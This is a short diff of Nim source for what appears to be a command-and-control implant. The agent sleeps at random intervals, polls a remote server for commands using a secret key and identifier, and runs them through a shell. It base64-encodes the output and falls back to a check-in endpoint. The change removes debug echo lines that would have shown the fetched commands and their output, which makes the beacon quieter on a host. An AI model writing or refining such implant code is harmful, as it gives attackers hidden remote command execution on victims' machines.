@@ -18,7 +18,6 @@ proc execute_command(command: string):string =
     commandArgs.add("-c")
     for element in command.split(" "):
         commandArgs.add(element)
-    echo $commandArgs
     let (output,status_code) = execCmdEx(command, options={poUsePath, poStdErrToStdOut, poDaemon})
     let encoded_command = encode($output)
     return $encoded_command
@@ -37,8 +36,6 @@ proc main() =
     while true:
         sleep random_sleep(sleep_time)
         var command_response = get_request_headers($url&"command",$secret_key,$identifier)
-        echo "getting response:"
-        echo $command_response
         if $command_response == "registration_error":
             var output = get_request_headers(url&"checkin",$secret_key,$identifier)
         else:
